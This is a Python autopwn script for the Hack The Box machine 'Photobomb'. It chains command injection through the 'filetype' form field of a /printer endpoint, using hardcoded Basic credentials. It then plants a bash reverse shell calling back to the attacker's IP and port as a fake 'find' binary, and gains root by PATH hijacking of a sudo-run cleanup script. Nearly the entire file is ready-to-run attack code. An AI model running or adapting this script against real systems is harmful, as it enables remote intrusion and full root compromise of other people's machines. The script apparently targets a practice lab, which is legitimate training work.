#!/usr/bin/env python3

"""
Autopwn Photobomb HTB
---------------------
Author : Marss
Date : 01 Nov, 2022
"""

import argparse
import requests
import signal
import sys
import shlex
import subprocess

from pwn import *


# Ctrl + c (function)
def signal_handler(signum, frame): sys.exit('\n[!] User terminated.')

# Ctrl + c (signal)
signal.signal(signal.SIGINT, signal_handler)


# Main class
class Exploit:
	def __init__(self, args):
		self.target_url = { '10.10.14.182' : 'http://photobomb.htb' }
		self.ip_address = args.ip
		self.port = args.port

	def make_request(self, command):
		try:
			headers = {
				'Authorization' : 'Basic cEgwdDA6YjBNYiE=',
				'Content-Type' : 'application/x-www-form-urlencoded'
			}

			form_data = {
				'photo' : 'eleanor-brooke-w-TLY0Ym4rM-unsplash.jpg',
				'filetype' : f'jpg;{command}',
				'dimensions' : '3000x2000'
			}
			
			response = requests.post(self.target_url['10.10.14.182'] + '/printer', headers=headers, data=form_data)
			
		except Exception as error:
			sys.exit("[x] Error: %s" % error)

	def command_inyection(self, command):
			self.make_request(command)

	def run(self):
		# Post request with command injection
		with log.progress('Starting Inyection Attack') as progress:

		    # (1) Create workstation
		    progress.status('Creating working directory')
		    self.command_inyection(f"mkdir /tmp/.{self.ip_address}")
		    log.info('Working directory created')
		    
		    # (2) Create binary with malicious code (reverse shell in bash)
		    progress.status('Inyecting malicious code into our binary file')
		    self.command_inyection(f"echo \"#!/bin/bash\\nbash -c 'bash -i >& /dev/tcp/{self.ip_address}/{self.port} 0>&1'\" > /tmp/.{self.ip_address}/find && chmod +x /tmp/.{self.ip_address}/find")
		    log.info(f'Binary created: /tmp/.{self.ip_address}/find')
		    
		    # (3) Listening mode
		    log.info(f'Open port {self.port} to receive root shell (g.e /usr/bin/nc -l {self.port})')
		    input('Press ENTER to continue.')
		    
		    # (4) Execute binary like root to receive shell
		    progress.success('Getting connection in a few seconds')
		    self.command_inyection(f"sudo PATH=/tmp/.{self.ip_address}:$PATH /opt/cleanup.sh")

		    # (5) Removing working directory and binary file
		    log.info('Removing working directory and files')
		    self.command_inyection(f"rm -rf /tmp/.{self.ip_address}")


# Main flow
if __name__ == '__main__':
	ascii_title = """
	                               __
	 /\      |_  _   _       _    |__) |_   _  |_  _  |_   _   _  |_ 
	/--\ |_| |_ (_) |_) \)/ | )   |    | ) (_) |_ (_) |_) (_) ||| |_)
	                |                                                
	                                                            by marss
    """
	parser = argparse.ArgumentParser(
		description=ascii_title,
		formatter_class=argparse.RawDescriptionHelpFormatter,
		epilog="""Example:
		autopwn.py -i 10.10.10.10 -p 4444
		""")

	parser.add_argument('-i', '--ip', required=True, help='specified IP to receive the shell')
	parser.add_argument('-p', '--port', required=True, help='specified PORT to receive the shell')

	args = parser.parse_args()

	print(ascii_title)

	exploit = Exploit(args)

	exploit.run()
